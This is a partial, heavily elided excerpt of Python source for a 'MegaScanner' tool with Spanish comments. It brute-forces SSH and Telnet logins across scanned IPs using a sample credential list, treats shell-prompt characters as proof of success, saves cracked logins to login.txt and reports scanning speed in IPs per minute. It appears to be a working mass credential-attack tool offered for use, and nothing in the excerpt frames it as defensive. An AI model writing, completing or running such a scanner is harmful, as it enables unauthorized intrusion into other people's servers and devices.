...
class MegaScanner:
    ...
    def init_log_file(self):
        """Inicializar archivo de log con encabezado"""
        with open(LOG_FILE, 'a') as f:
            f.write("=" * 80 + "\n")
            f.write(f"MEGA SCANNER LOG - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 80 + "\n\n")
    
    def save_login(self, ip, port, service, username, password, status="SUCCESS"):
        """Guardar login exitoso en archivo"""
    ...
    def attack_ssh(self, ip, port=22):
        ...
        for username, password in creds_sample:
            ...
            try:
                ...
                # Guardar en archivo
                self.save_login(ip, port, "SSH", username, password, "SUCCESS")
        ...
        for username, password in creds_sample:
            ...
            try:
                ...
                if b"OK" in data or b"#" in data or b"$" in data or b">" in data:
                    ...
                    # Guardar en archivo
                    self.save_login(ip, port, "Telnet", username, password, "SUCCESS")
        ...
        if elapsed > 0:
            ...
            if os.path.exists(LOG_FILE):
                with open(LOG_FILE, 'r') as f:
                    lines = f.readlines()
                    login_count = sum(1 for line in lines if "IP:" in line)
                print(f"[📊] Logins saved: {login_count}")
...
[🎯] Starting in 3 seconds...""")
        ...
        print("[💾] All logins will be saved to login.txt")
    ...
    def show_final_stats(self):
        ...
        print(f"[⚡] Average speed: {self.stats['scanned']/total_time*60:.0f} IPs/min")
        print(f"[💾] Log file: {LOG_FILE}")
        
        # Leer archivo de log para mostrar conteo
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, 'r') as f:
                lines = f.readlines()
                login_count = sum(1 for line in lines if "IP:" in line)
                ...
                # Mostrar últimos 5 logins si hay
                if login_count > 0:
                    print(f"\n[📋] LAST 5 LOGINS:")
                    last_logins = []
                    current_login = []
                    for line in lines:
                        if line.startswith("[+]"):
                            if current_login:
                                last_logins.append("".join(current_login))
                                if len(last_logins) > 5:
                                    last_logins.pop(0)
                            current_login = [line]
                        elif current_login:
                            current_login.append(line)
                    
                    if current_login and len(last_logins) < 5:
                        last_logins.append("".join(current_login))
                    
                    for login in last_logins[-5:]:
                        print(login.strip())
                        print("-" * 40)
        
        print(f"{'='*80}")
        print(f"[✅] Scan completed. Check '{LOG_FILE}' for all successful logins.")
